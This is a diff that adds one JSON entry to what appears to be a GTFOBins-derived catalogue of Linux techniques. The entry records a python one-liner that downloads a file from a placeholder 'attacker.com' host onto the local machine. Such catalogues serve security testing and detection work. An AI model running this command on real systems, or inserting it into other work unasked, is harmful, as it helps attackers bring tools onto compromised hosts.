@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-python-download",
+  "name": "GTFOBins · python (download)",
+  "command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'",
+  "description": "Use python to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "python",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/python/#download",
+  "upstream_id": "python/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/python/"
+    }
+  ]
+}
